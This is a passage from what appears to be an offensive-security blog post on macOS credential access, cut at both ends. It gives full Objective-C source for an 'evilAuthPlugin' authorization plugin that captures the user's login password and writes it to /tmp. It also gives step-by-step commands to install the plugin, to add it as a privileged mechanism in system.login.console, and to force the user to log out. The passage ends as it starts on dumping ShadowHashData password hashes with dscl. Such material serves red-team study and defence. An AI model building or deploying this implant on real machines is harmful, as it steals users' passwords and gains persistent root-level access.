</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:status&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;MCXMechanism:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;CryptoTokenKit:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:done&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;/array&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;11&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>the <code>mechanisms</code> array has a format of <code>&lt;plugin&gt;:&lt;mechanism&gt;</code>, and occasionally <code>,privileged</code>, which means it runs as root. all these mechanisms need to return <code>kAuthorizationResultAllow</code>, otherwise the entire process fails. each plugin in this list gets called in order, as well.</p>
<p>the two main components of authorization in macOS are a user-and-owner model from BSD that applies to files + folders, and policy-based authorization requests for greater granularity. appls pass a list of requested rights to the Security Server which compares them against the authorization database. if there&rsquo;s no valid cache entry, users might have to authenticate.</p>
<p>you can track rules + rights requested for certain actions, which is useful to see which rights are needed where.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo log show --style syslog --predicate <span style="color:#f1fa8c">&#39;subsystem == &#34;com.apple.Authorization&#34; &amp;&amp; eventMessage CONTAINS[c] &#34;validating credential&#34;&#39;</span> --last 8h
</span></span><span style="display:flex;"><span>Filtering the log data using <span style="color:#f1fa8c">&#34;subsystem == &#34;</span>com.apple.Authorization<span style="color:#f1fa8c">&#34; AND composedMessage CONTAINS[c] &#34;</span>validating credential<span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Skipping info and debug messages, pass --info and/or --debug to include.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Timestamp                       <span style="color:#ff79c6">(</span>process<span style="color:#ff79c6">)[</span>PID<span style="color:#ff79c6">]</span>    
</span></span><span style="display:flex;"><span>2024-10-10 09:21:47.878819-0400  localhost authd<span style="color:#ff79c6">[</span>445<span style="color:#ff79c6">]</span>: <span style="color:#ff79c6">[</span>com.apple.Authorization:authd<span style="color:#ff79c6">]</span> Validating credential bilal <span style="color:#ff79c6">(</span>501<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">for</span> use-login-window-ui <span style="color:#ff79c6">(</span>engine 3299<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>it&rsquo;s becoming increasingly likely that we can install our own authorization plugin into a system. first, i need to dump a copy of the right that i need (<code>system.login.console</code>): <code>security authorizationdb read system.login.console &gt; poc.plist</code>.</p>
<p>since i want to create my own plugin and add it to the list after the user&rsquo;s password is confirmed (by <code>HomeDirMechanism</code> returning <code>true</code>), i&rsquo;ll need to craft some code and use the functions <code>AuthorizationRightGet</code> and <code>AuthorizationRightSet</code>. modifying the code taken from <a href="https://github.com/alex030/UserConfigAgent/blob/42e3d786d52604b3cfbcdf8c77320093684626d7/UserConfigAgentPlugin/main.m"  target="_blank" rel="noreferrer nofollow">here</a>
 (which is a UserConfigAgent program written in Objective-C), it should allow us to create an implant that will store the user&rsquo;s password when they log back in.</p>
<p>this is the <code>main.m</code> function of the <code>evilAuthPlugin</code> <a href="https://github.com/xorrior/macOSTools/tree/master/auth_plugins/evilAuthPlugin"  target="_blank" rel="noreferrer nofollow">program</a>
. you can modify the <code>MechanismInvoke()</code> function to perform any action, but for now it just saves the user&rsquo;s password to <code>/private/tmp/password.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objc" data-lang="objc"><span style="display:flex;"><span><span style="color:#ff79c6">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#import &lt;Security/AuthorizationPlugin.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Security/AuthSession.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Security/AuthorizationTags.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;CoreServices/CoreServices.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&#34;Common.h&#34;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;syslog.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kKMAuthAuthorizeRight &#34;authorize-right&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kMechanismMagic &#34;MLSP&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kPluginMagic &#34;PlgN&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> PluginRecord {
</span></span><span style="display:flex;"><span>    OSType                          fMagic;         <span style="color:#6272a4">// must be kPluginMagic
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> AuthorizationCallbacks <span style="color:#ff79c6">*</span>  fCallbacks;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> PluginRecord PluginRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> MechanismRecord {
</span></span><span style="display:flex;"><span>    OSType                          fMagic;         <span style="color:#6272a4">// must be kMechanismMagic
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    AuthorizationEngineRef          fEngine;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> PluginRecord <span style="color:#ff79c6">*</span>            fPlugin;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">Boolean</span>                         fWaitForDebugger;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> MechanismRecord MechanismRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSString <span style="color:#ff79c6">*</span><span style="color:#50fa7b">GetStringFromContext</span>(<span style="color:#ff79c6">struct</span> MechanismRecord <span style="color:#ff79c6">*</span>mechanism, AuthorizationString key) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> AuthorizationValue <span style="color:#ff79c6">*</span>value;
</span></span><span style="display:flex;"><span>    AuthorizationContextFlags flags;
</span></span><span style="display:flex;"><span>    OSStatus err <span style="color:#ff79c6">=</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>GetContextValue(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine, key, <span style="color:#ff79c6">&amp;</span>flags, <span style="color:#ff79c6">&amp;</span>value);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (err <span style="color:#ff79c6">==</span> errSecSuccess <span style="color:#ff79c6">&amp;&amp;</span> value<span style="color:#ff79c6">-&gt;</span>length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>s <span style="color:#ff79c6">=</span> [[NSString alloc] <span style="color:#8be9fd;font-style:italic">initWithBytes</span>:value<span style="color:#ff79c6">-&gt;</span>data
</span></span><span style="display:flex;"><span>                                            <span style="color:#8be9fd;font-style:italic">length</span>:value<span style="color:#ff79c6">-&gt;</span>length
</span></span><span style="display:flex;"><span>                                             <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding];
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [s <span style="color:#8be9fd;font-style:italic">stringByReplacingOccurrencesOfString</span>:<span style="color:#f1fa8c">@&#34;</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#8be9fd;font-style:italic">withString</span>:<span style="color:#f1fa8c">@&#34;&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">nil</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSString <span style="color:#ff79c6">*</span><span style="color:#50fa7b">GetStringFromHint</span>(MechanismRecord <span style="color:#ff79c6">*</span>mechanism, AuthorizationString key) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> AuthorizationValue <span style="color:#ff79c6">*</span>value;
</span></span><span style="display:flex;"><span>    OSStatus err <span style="color:#ff79c6">=</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>GetHintValue(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine, key,<span style="color:#ff79c6">&amp;</span>value);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (err <span style="color:#ff79c6">==</span> errSecSuccess <span style="color:#ff79c6">&amp;&amp;</span> value<span style="color:#ff79c6">-&gt;</span>length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>s <span style="color:#ff79c6">=</span> [[NSString alloc] <span style="color:#8be9fd;font-style:italic">initWithBytes</span>:value<span style="color:#ff79c6">-&gt;</span>data
</span></span><span style="display:flex;"><span>                                               <span style="color:#8be9fd;font-style:italic">length</span>:value<span style="color:#ff79c6">-&gt;</span>length
</span></span><span style="display:flex;"><span>                                             <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding];
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [s <span style="color:#8be9fd;font-style:italic">stringByReplacingOccurrencesOfString</span>:<span style="color:#f1fa8c">@&#34;</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#8be9fd;font-style:italic">withString</span>:<span style="color:#f1fa8c">@&#34;&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">nil</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">AllowLogin</span>(MechanismRecord <span style="color:#ff79c6">*</span>mechanism) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>SetResult(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine,kAuthorizationResultAllow);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismCreate</span>(AuthorizationPluginRef inPlugin,AuthorizationEngineRef inEngine,AuthorizationMechanismId mechanismId,AuthorizationMechanismRef <span style="color:#ff79c6">*</span>outMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(MechanismRecord));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (mechanism <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) <span style="color:#ff79c6">return</span> errSecMemoryError;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fMagic <span style="color:#ff79c6">=</span> kMechanismMagic;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fEngine <span style="color:#ff79c6">=</span> inEngine;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin <span style="color:#ff79c6">=</span> (PluginRecord <span style="color:#ff79c6">*</span>)inPlugin;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outMechanism <span style="color:#ff79c6">=</span> mechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismDestroy</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    free(inMechanism);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismInvoke</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)inMechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">@autoreleasepool</span> {
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Make sure this is not a hidden user.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>username <span style="color:#ff79c6">=</span> GetStringFromContext(mechanism, kAuthorizationEnvironmentUsername);
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>password <span style="color:#ff79c6">=</span> GetStringFromContext(mechanism, kAuthorizationEnvironmentPassword);
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// NSString *sesOwner = GetStringFromHint(mechanism, kKMAuthSuggestedUser);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        NSString <span style="color:#ff79c6">*</span>AuthAuthorizeRight <span style="color:#ff79c6">=</span> GetStringFromHint(mechanism, kKMAuthAuthorizeRight);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Make sure we have username and password data.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>username <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>password) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> AllowLogin(mechanism);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">BOOL</span> keychainPasswordValid <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">YES</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        SecKeychainSetUserInteractionAllowed(<span style="color:#8be9fd;font-style:italic">NO</span>);
</span></span><span style="display:flex;"><span>        keychainPasswordValid <span style="color:#ff79c6">=</span> ValidateLoginKeychainPassword(password);
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Revert back to the default ids
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        pthread_setugid_np(KAUTH_UID_NONE, KAUTH_GID_NONE);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//NSData *passwordData = [NSKeyedArchiver archivedDataWithRootObject:password];
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (keychainPasswordValid) {
</span></span><span style="display:flex;"><span>            [password <span style="color:#8be9fd;font-style:italic">writeToFile</span>:<span style="color:#f1fa8c">@&#34;/private/tmp/password.txt&#34;</span> <span style="color:#8be9fd;font-style:italic">atomically</span>:<span style="color:#8be9fd;font-style:italic">TRUE</span> <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding <span style="color:#8be9fd;font-style:italic">error</span>:<span style="color:#8be9fd;font-style:italic">NULL</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> AllowLogin(mechanism);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismDeactivate</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)inMechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>DidDeactivate(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">PluginDestroy</span>(AuthorizationPluginRef inPlugin) {
</span></span><span style="display:flex;"><span>    free(inPlugin);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">AuthorizationPluginCreate</span>(
</span></span><span style="display:flex;"><span>                                   <span style="color:#ff79c6">const</span> AuthorizationCallbacks <span style="color:#ff79c6">*</span>callbacks,
</span></span><span style="display:flex;"><span>                                   AuthorizationPluginRef <span style="color:#ff79c6">*</span>outPlugin,
</span></span><span style="display:flex;"><span>                                   <span style="color:#ff79c6">const</span> AuthorizationPluginInterface <span style="color:#ff79c6">**</span>outPluginInterface) {
</span></span><span style="display:flex;"><span>    PluginRecord <span style="color:#ff79c6">*</span>plugin <span style="color:#ff79c6">=</span> (PluginRecord <span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(PluginRecord));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (plugin <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) <span style="color:#ff79c6">return</span> errSecMemoryError;
</span></span><span style="display:flex;"><span>    plugin<span style="color:#ff79c6">-&gt;</span>fMagic <span style="color:#ff79c6">=</span> kPluginMagic;
</span></span><span style="display:flex;"><span>    plugin<span style="color:#ff79c6">-&gt;</span>fCallbacks <span style="color:#ff79c6">=</span> callbacks;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outPlugin <span style="color:#ff79c6">=</span> plugin;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">static</span> AuthorizationPluginInterface pluginInterface <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        kAuthorizationPluginInterfaceVersion,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>PluginDestroy,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismCreate,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismInvoke,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismDeactivate,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismDestroy
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outPluginInterface <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>pluginInterface;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>opening the project in XCode, there are some housekeeping items to be performed first.</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-info.png" alt="alt text"  />
</p>
</p>
<p>the <code>info.plist</code> shows the high-level details of the plugin, including the bundle name and bundle identifier. we&rsquo;ll change this to be something a little more innocuous.</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-name.png" alt="alt text"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-bundleID.png" alt="alt text"  />
</p>
</p>
<p>note: the bundle name and identifier should match.</p>
<p>build the project in XCode (Product -&gt; Build), and then access the build via the Products directory on the left. when you find it in Finder, compress it and copy it over to the <code>/Library/Security/SecurityAgentPlugins</code> directory. once it&rsquo;s copied over, unzip it into the directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo cp evilAuthPlugin.bundle.zip /Library/Security/SecurityAgentPlugins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo unzip evilAuthPlugin.bundle.zip             
</span></span><span style="display:flex;"><span>Archive:  evilAuthPlugin.bundle.zip
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/_CodeSignature/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/MacOS/
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/Info.plist  
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/_CodeSignature/CodeResources  
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/MacOS/evilAuthPlugin  
</span></span></code></pre></div><p>before proceeding, we have to modify the <code>poc.plist</code> file. add the following line: <code>&lt;string&gt;BundleName:login,privileged&lt;/string&gt;</code> to the file, so that it looks like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;plist version=&#34;1.0&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Login mechanism based rule.  Not for general use, yet.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;mechanisms&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;array&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:prelogin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:policy-banner&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-begin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:reset-password,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:FDESupport,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:forward-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:auto-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:authenticate,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;PKINITMechanism:auth,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:status&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;BundleName:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;MCXMechanism:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;CryptoTokenKit:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:done&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;/array&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;11&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span></code></pre></div><p>update the authorization database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>security authorizationdb write system.login.console &lt; poc.plist      
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>you can force logout the user via the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo launchctl bootout user/<span style="color:#ff79c6">$(</span>id -u &lt;username&gt;<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>when they log back in, the code will have executed and the password will be at <code>/private/tmp/password.txt</code>!</p>
<p>just some notes on this method, if you&rsquo;re experimenting: modifying the login process is quite risky, and potentially dangerous. if you&rsquo;re not sure what you&rsquo;re doing, you could prevent anybody from logging in (including yourself) via the login screen.</p>
<h1 id="credential-access-via-shadowhashdata">credential access via ShadowHashData</h1>
<p><code>ShadowHashData</code> is a mechanism in macOS used to store hashed password data for user accounts. it&rsquo;s stored as binary <code>.plist</code> files for each user account in <code>/var/db/dslocal/nodes/Default/users/</code>.</p>
<p>you can extract it via <code>default</code> or <code>dscl</code> utilities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dscl . <span style="color:#8be9fd;font-style:italic">read</span> /Users/<span style="color:#8be9fd;font-style:italic">$USERNAME</span> ShadowHashData
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dsAttrTypeNative:ShadowHashData:
